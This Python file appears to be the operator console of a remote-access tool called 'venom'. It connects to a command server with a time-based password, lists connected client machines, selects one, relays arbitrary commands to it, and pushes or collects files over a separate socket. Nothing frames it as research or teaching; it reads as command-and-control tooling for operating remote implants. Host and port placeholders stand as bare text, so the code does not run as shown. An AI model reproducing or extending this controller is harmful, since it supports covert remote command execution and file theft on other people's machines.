import socket
import os
import subprocess
import time
import datetime
import threading
from queue import Queue

version = "1.0"

host_list = ["HOST IP GOES HERE"]
transfer_dir = os.getcwd()

def connect(port):

    global s
    print("\nFinding Server...")

    while True:
        # try:
        while True:
            for host in host_list:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    break
                except:
                    continue

            s.send(str.encode("admin-client"))
            try:
                s.settimeout(15)
                password = s.recv(32).decode('utf-8')
                if password == "password:":
                    date = datetime.datetime.now()
                    local_time = date.time()
                    s.send(str.encode(str((local_time.minute + 348)/((3 + date.month)/date.day * 4))))
            except Exception as e:
                print(e)
            break

        print("Connection Found\n")
        s.settimeout(None)
        auth_stat = s.recv(64).decode("utf-8")
        print(auth_stat+ "\n")
        if auth_stat == "Authentication Succeeded":
            break
        elif auth_stat == "Authentication Failed":
            continue
        else:
            print("Exception in auth occured...")
            continue
        # except:
        #     continue

connect(HOST PORT GOES HERE)

while True:
    try:
        s.settimeout(None)
        cmd = input(":venom- ")
        s.send(cmd.encode('utf-8'))

        if "select " in cmd:

            s.settimeout(10)
            try:
                info = s.recv(1024).decode('utf-8')
            except:
                print("Error Occured on Server\n")
            if info == "Invalid Connection Request" or info == "You need to get a brain...":
                print(info + "\n")
            else:
                while True:

                    s.settimeout(None)
                    cmd = input(f":{info}% ")

                    if cmd == "disconnect":
                        s.send(str.encode(cmd))
                        break

                    if "file transfer " in cmd:

                        f_name = cmd.replace("file transfer ", "")

                        if not os.path.exists(f"{os.getcwd()}/{f_name}"):
                            print("Error: This file path does not exist.")
                            continue

                        s.send(cmd.encode('utf-8'))

                        cmd = cmd.replace("file transfer ","")

                        print("----------\nEstablishing Socket")

                        while True:
                            try:
                                while True:
                                    for host in host_list:
                                        try:
                                            f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            f.connect((host, TRANSFER PORT GOES HERE))
                                            break
                                        except:
                                            continue

                                    f.send(str.encode("admin-client"))
                                    time.sleep(1)
                                    break

                                print("Connection Found")
                                break
                            except:
                                continue

                        print("----------\nConfiguring File Byte Length")

                        try:
                            data_len = os.path.getsize(f"{transfer_dir}/{cmd}")
                            f.send(str(data_len).encode('utf-8'))
                            print(f"Sent File Byte Length : {data_len}")
                        except Exception as e:
                            print(e)

                        time.sleep(1)

                        print("----------\nAttempting Byte Transfer")

                        try:
                            time.sleep(1)
                            file = open(f"{transfer_dir}/{cmd}", "rb")
                            data = file.read(data_len)
                            f.sendall(data)
                            file.close()
                            print("Bytes succesfully sent file over TCP")
                        except:
                            print("Error occured with sending bytes.")

                        f.close()
                        print("----------")

                    elif "file collect " in cmd:

                        s.send(cmd.encode('utf-8'))

                        path = cmd.replace("file collect ", "")

                        print("----------\nEstablishing Socket")

                        while True:
                            try:
                                while True:
                                    for host in host_list:
                                        try:
                                            f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            f.connect((host, TRANSFER PORT GOES HERE))
                                            break
                                        except:
                                            continue

                                    f.send(str.encode("admin-client"))
                                    break

                                print("Connection Found")
                                break
                            except:
                                continue

                        print("----------\nCalculating Byte Recieving Length")

                        try:
                            data_len = f.recv(64).decode('utf-8')
                            if data_len == "":
                                print("Error: This file doesnt exist")
                                data_len = 0
                            else:
                                data_len = int(data_len)
                                print(f"Byte length : {data_len}")
                        except Exception as e:
                            print(e)

                        print("----------\nAttempting Byte Recieving/Writing")

                        try:
                            if data_len != 0:
                                if os.path.exists(f"{os.getcwd()}/{path}"):
                                    print(f"Overwriting {path}")
                                    os.remove(f"{os.getcwd()}/{path}")
                                file = open(f"{os.getcwd()}/{path}", "wb")
                                print("File Opened Successfully")
                                data_len = int(data_len)
                                if data_len < 819200:
                                    bytes = f.recv(data_len)
                                    file.write(bytes)
                                else:
                                    n = round(data_len / 40960)
                                    if str(n) in str(data_len / 40960):
                                        n += 1
                                    print(n)
                                    for i in range(n):
                                        bytes = f.recv(40960)
                                        file.write(bytes)
                                file.close()
                        except Exception as e:
                            print("Unexpected error occured with File Writing/Recieving")
                            print(e)

                        f.close()
                        print("----------")

                    else:
                        s.send(str.encode(cmd))
                        recievement = s.recv(819200).decode('utf-8')
                        print(recievement)


        elif "list clients" in cmd:
            clients = s.recv(40960).decode('utf-8')
            print(clients + "\n")

        else:
            result = s.recv(32).decode('utf-8')
            print(result)
    except:
        s.close()
        print("Processes Terminated")
        connect(HOST PORT GOES HERE)
